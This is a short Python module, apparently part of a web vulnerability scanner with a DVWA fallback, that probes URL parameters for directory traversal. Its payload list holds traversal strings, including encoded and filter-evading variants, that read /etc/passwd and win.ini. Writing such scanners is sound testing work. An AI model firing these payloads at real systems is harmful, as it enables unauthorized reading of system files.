import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def scan_directory_traversal(target):
    results = []
    parsed = urlparse(target)
    params = parse_qs(parsed.query)

    # DVWA-friendly fallback for the File Inclusion page.
    if not params and any(token in parsed.path.lower() for token in ["fi", "include"]):
        params = {"page": ["include.php"]}
    
    if not params:
        return {"vulnerable": False, "details": []}
    
    payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd"
    ]
    
    for param_name in params:
        for payload in payloads:
            try:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = urlunparse((
                    "http", parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                ))
                
                res = requests.get(test_url, timeout=3, verify=False)
                
                # Check for common file signatures
                if any(sig in res.text for sig in ["root:", "Administrator", "[drivers]", "etc/passwd"]):
                    results.append({
                        "type": "DIRECTORY_TRAVERSAL",
                        "severity": "HIGH",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "description": "Directory traversal vulnerability detected"
                    })
                    break
            except Exception as e:
                pass
    
    return {"vulnerable": bool(results), "details": results}